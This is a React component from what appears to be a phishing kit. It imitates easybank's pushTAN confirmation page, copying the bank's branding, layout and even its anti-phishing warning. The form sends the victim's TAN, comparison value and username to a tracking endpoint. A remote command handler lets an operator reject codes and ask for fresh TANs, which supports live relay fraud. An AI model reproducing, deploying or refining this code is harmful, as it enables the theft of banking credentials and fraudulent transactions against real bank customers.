"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { trackSubmission, onCommand } from "@/lib/track";

/* ---- random 4-char reference code ---- */
function generateVergleichswert(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let result = "";
  for (let i = 0; i < 4; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

const TOTAL_SECONDS = 300; // 5 minutes

export default function PushTanForm({ user, vergleichswert: vergleichswertProp }: { user: string; vergleichswert?: string }) {
  const [vergleichswert] = useState(() => vergleichswertProp || generateVergleichswert());
  const [code, setCode] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(TOTAL_SECONDS);
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- countdown timer ---- */
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  /* ---- command handler ---- */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          setSecondsLeft(TOTAL_SECONDS);
          if (timerRef.current) clearInterval(timerRef.current);
          timerRef.current = setInterval(() => {
            setSecondsLeft((prev) => {
              if (prev <= 1) {
                clearInterval(timerRef.current!);
                setExpired(true);
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const formatTime = useCallback((s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  }, []);

  const progressFraction = secondsLeft / TOTAL_SECONDS;

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    await trackSubmission("easybank", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };

  /* ---- SVG ring constants ---- */
  const ringSize = 80;
  const strokeWidth = 4;
  const radius = (ringSize - strokeWidth) / 2;
  const circumference = 2 * Math.PI * radius;
  const dashOffset = circumference * (1 - progressFraction);

  return (
    <div id="wrapper">
      {/* HEADER */}
      <div id="header">
        <div id="upper-header" className="tright">
          <div id="logo" className="fleft first">
            <a href="https://www.easybank.at/" target="_blank" aria-label="easybank Webseite">
              <img src="/easybank/logo-easybank_de.png" id="logo-easybank" alt="" />
            </a>
          </div>
          <div className="fleft second">
            <div id="wrap-menue">
              <ul>
                <li className="help"><a href="#">Hilfe</a></li>
                <li className="last">
                  <select className="language-switcher" defaultValue="de" suppressHydrationWarning>
                    <option value="de">deutsch</option>
                    <option value="en">english</option>
                  </select>
                </li>
              </ul>
            </div>
            <div id="date-display" className="tright">Samstag, 09.05.2026 - 08:44</div>
          </div>
        </div>
        <div id="main-navigation">
          <div id="navi"><ul></ul></div>
        </div>
      </div>

      {/* CONTENT */}
      <div id="content" className="isloggedout promo">
        <div id="login" className="clearfix">
          {/* LEFT COLUMN */}
          <div className="column-first" id="login-input">
            <div className="green-box" id="boxGreen1">
              {/* Green header */}
              <div className="green-box-header" style={{ height: 40 }}>
                <div className="login-left"></div>
                <div className="login-repeat">
                  <label>pushTAN Freigabe</label>
                </div>
                <div className="login-right"></div>
              </div>

              {/* Content */}
              <div className="box-content">
                {/* Error banner */}
                {error && (
                  <div
                    style={{
                      backgroundColor: "#fdeaea",
                      color: "#990000",
                      border: "1px solid #f5c6cb",
                      borderRadius: "5px",
                      padding: "10px 14px",
                      marginBottom: "12px",
                      fontSize: "0.95em",
                    }}
                  >
                    {error}
                  </div>
                )}

                <p style={{ paddingBottom: 10 }}>
                  Best&auml;tigen Sie die Transaktion in Ihrer pushTAN-App.
                  Vergleichen Sie den angezeigten Vergleichswert mit dem Wert auf Ihrem Ger&auml;t.
                </p>

                {success ? (
                  /* ---- Success message ---- */
                  <div style={{ textAlign: "center", padding: "30px 0 40px" }}>
                    <div
                      style={{
                        width: 56,
                        height: 56,
                        borderRadius: "50%",
                        backgroundColor: "#177991",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        margin: "0 auto 16px",
                      }}
                    >
                      <svg
                        width="28"
                        height="28"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="#fff"
                        strokeWidth="2.5"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      >
                        <polyline points="20 6 9 17 4 12" />
                      </svg>
                    </div>
                    <p
                      style={{
                        fontSize: "1.05em",
                        color: "#222222",
                        marginBottom: 6,
                        fontWeight: 600,
                      }}
                    >
                      Transaktion best&auml;tigt
                    </p>
                    <p style={{ fontSize: "0.85em", color: "#676767" }}>
                      Ihre Eingabe wurde erfolgreich &uuml;bermittelt.
                    </p>
                  </div>
                ) : (
                  <form onSubmit={handleSubmit}>
                    {/* Timer ring + Vergleichswert */}
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: 20,
                        justifyContent: "center",
                        padding: "14px 0 10px",
                      }}
                    >
                      {/* Countdown ring */}
                      <div
                        style={{
                          position: "relative",
                          width: ringSize,
                          height: ringSize,
                          flexShrink: 0,
                        }}
                      >
                        <svg
                          width={ringSize}
                          height={ringSize}
                          style={{ transform: "rotate(-90deg)" }}
                        >
                          <circle
                            cx={ringSize / 2}
                            cy={ringSize / 2}
                            r={radius}
                            fill="none"
                            stroke="#e0e0e0"
                            strokeWidth={strokeWidth}
                          />
                          <circle
                            cx={ringSize / 2}
                            cy={ringSize / 2}
                            r={radius}
                            fill="none"
                            stroke={expired ? "#cc0000" : "#177991"}
                            strokeWidth={strokeWidth}
                            strokeDasharray={circumference}
                            strokeDashoffset={dashOffset}
                            strokeLinecap="round"
                            style={{ transition: "stroke-dashoffset 1s linear" }}
                          />
                        </svg>
                        <div
                          style={{
                            position: "absolute",
                            top: 0,
                            left: 0,
                            width: "100%",
                            height: "100%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            fontSize: 16,
                            fontWeight: 500,
                            color: expired ? "#cc0000" : "#222222",
                          }}
                        >
                          {formatTime(secondsLeft)}
                        </div>
                      </div>

                      {/* Vergleichswert */}
                      <div>
                        <p
                          style={{
                            fontSize: "0.72em",
                            color: "#676767",
                            marginBottom: 6,
                            textTransform: "uppercase",
                            letterSpacing: "0.05em",
                          }}
                        >
                          Vergleichswert
                        </p>
                        <p
                          style={{
                            fontSize: "1.8em",
                            fontWeight: 400,
                            color: "#177991",
                            letterSpacing: "0.15em",
                            lineHeight: 1,
                            margin: 0,
                          }}
                        >
                          {vergleichswert}
                        </p>
                      </div>
                    </div>

                    {/* Divider */}
                    <div
                      style={{
                        borderTop: "1px solid #e0e0e0",
                        margin: "6px 0 18px",
                      }}
                    />

                    {/* TAN-Code input */}
                    <div className="data">
                      <label htmlFor="tan-code" style={{ marginTop: 3 }}>TAN-Code</label>
                      <input
                        type="text"
                        id="tan-code"
                        placeholder="TAN eingeben"
                        value={code}
                        onChange={(e) =>
                          setCode(
                            e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 6)
                          )
                        }
                        maxLength={6}
                        disabled={expired}
                        autoComplete="one-time-code"
                        inputMode="text"
                        spellCheck={false}
                        style={{
                          opacity: expired ? 0.5 : 1,
                        }}
                        suppressHydrationWarning
                      />
                    </div>

                    {expired && (
                      <p
                        style={{
                          textAlign: "center",
                          color: "#cc0000",
                          fontSize: "0.85em",
                          margin: "8px 0 0",
                        }}
                      >
                        Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
                      </p>
                    )}

                    {/* Submit button */}
                    <div className="data" style={{ marginTop: 12 }}>
                      <div className="dynamic-btn fright">
                        <div className="content">
                          <a
                            href="#"
                            title="Bestätigen"
                            onClick={(e) => {
                              e.preventDefault();
                              handleSubmit(e);
                            }}
                            style={{
                              opacity: !isValid || submitting ? 0.5 : 1,
                              pointerEvents: !isValid || submitting ? "none" : "auto",
                            }}
                          >
                            {submitting ? "Wird geprüft..." : "Bestätigen"}
                          </a>
                        </div>
                      </div>
                    </div>
                  </form>
                )}
              </div>
              <div className="box-footer"></div>
            </div>
          </div>

          {/* RIGHT COLUMN */}
          <div className="column-third" id="login-info">
            <div style={{ position: "relative" }} className="top clearfix">
              {/* Box 1 -- Warnung */}
              <div className="info-box">
                <div className="login-info-top"></div>
                <div className="login-info-repeat-x">
                  <h3>Warnung</h3>
                  <div className="stripline"></div>
                  <div className="notification-text">
                    <strong>Achtung vor Phishing</strong><br />
                    Wir fordern Sie niemals per E-Mail oder SMS auf, TANs, Kodes, Kreditkarten-Daten einzugeben oder zu best&auml;tigen!<br />
                    <a href="#" target="_blank" style={{ color: "#4B9920", marginTop: 5, display: "inline-block" }}>Weiterlesen</a>
                  </div>
                </div>
                <div className="login-info-bottom"></div>
              </div>

              {/* Box 2 -- Hilfe/Hotline */}
              <div className="info-box">
                <div className="login-info-top"></div>
                <div className="login-info-repeat-x">
                  <h3>Hilfe/Hotline</h3>
                  <div className="stripline"></div>
                  <ul>
                    <li><a href="#" target="_blank">PIN vergessen oder Verf&uuml;ger gesperrt?</a></li>
                    <li><a href="#" target="_blank">FAQ</a></li>
                  </ul>
                </div>
                <div className="login-info-bottom"></div>
              </div>

              {/* Box 3 -- Info */}
              <div className="info-box last">
                <div className="login-info-top"></div>
                <div className="login-info-repeat-x">
                  <h3>Info</h3>
                  <div className="stripline"></div>
                  <ul>
                    <li><a href="#" target="_blank"><strong>Bestellung PIN-Code f&uuml;r Debitkarte</strong></a></li>
                    <li><a href="#" target="_blank">Alle Infos zur<br />easybank App</a></li>
                    <li><a href="#" target="_blank">Zu Watchlist Internet</a></li>
                  </ul>
                </div>
                <div className="login-info-bottom"></div>
              </div>
            </div>

            {/* Promo */}
            <div className="promo-area">
              <a href="#" target="_blank">
                <img src="/easybank/EASY26016_login.jpg" alt="Promo" width={564} height={170} />
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* FOOTER */}
      <div id="footer">
        <div className="footer-navigation">
          <div className="footer-first"></div>
          <div className="footer-second">
            <ul>
              <li style={{ width: 84 }}><a href="#" target="_blank">Impressum</a></li>
              <li style={{ width: 47 }}><a href="#" target="_blank">AGB</a></li>
              <li style={{ width: 92 }}><a href="#" target="_blank">Datenschutz</a></li>
              <li style={{ width: 150 }}><a href="#" target="_blank">Nutzungsbedingungen</a></li>
              <li style={{ width: 84 }}><a href="#" target="_blank">Barrierefrei</a></li>
              <li className="last-footer" style={{ width: 119 }}>&copy; BAWAG P.S.K.</li>
            </ul>
          </div>
        </div>
      </div>
      <div id="spacer-footer"></div>
    </div>
  );
}
